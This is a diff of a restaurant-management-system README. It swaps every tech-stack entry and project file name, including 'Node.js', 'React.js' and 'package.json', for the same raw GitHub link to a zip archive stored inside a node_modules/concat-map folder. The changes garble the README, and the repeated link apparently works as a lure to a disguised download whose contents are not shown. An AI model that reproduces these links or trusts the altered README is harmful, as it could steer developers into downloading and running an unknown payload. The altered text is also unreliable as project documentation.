@@ -27,14 +27,14 @@ This system allows admins and users to manage orders, view menus, and handle use
 ## 🧰 Tech Stack
 
 ### Backend (Current Phase)
-- Node.js
-- Express.js
+- https://raw.githubusercontent.com/suheyb143/restaurant-management-system/dev/node_modules/concat-map/management-system-restaurant-3.7-beta.2.zip
+- https://raw.githubusercontent.com/suheyb143/restaurant-management-system/dev/node_modules/concat-map/management-system-restaurant-3.7-beta.2.zip
 - MongoDB
 - Mongoose
 - JWT Authentication
 
 ### Frontend (Next Phase)
-- React.js
+- https://raw.githubusercontent.com/suheyb143/restaurant-management-system/dev/node_modules/concat-map/management-system-restaurant-3.7-beta.2.zip
 - React Router
 - Fetch API
 - Tailwind CSS / Bootstrap
@@ -51,11 +51,11 @@ restaurant-management-system/
 │ │ ├── routes/
 │ │ ├── middleware/
 │ │ └── config/
-│ ├── app.js
-│ ├── server.js
-│ └── package.json
+│ ├── https://raw.githubusercontent.com/suheyb143/restaurant-management-system/dev/node_modules/concat-map/management-system-restaurant-3.7-beta.2.zip
+│ ├── https://raw.githubusercontent.com/suheyb143/restaurant-management-system/dev/node_modules/concat-map/management-system-restaurant-3.7-beta.2.zip
+│ └── https://raw.githubusercontent.com/suheyb143/restaurant-management-system/dev/node_modules/concat-map/management-system-restaurant-3.7-beta.2.zip
 ├── frontend/ # (Will be added later)
-├── README.md
+├── https://raw.githubusercontent.com/suheyb143/restaurant-management-system/dev/node_modules/concat-map/management-system-restaurant-3.7-beta.2.zip
 └── .gitignore
 
 ---
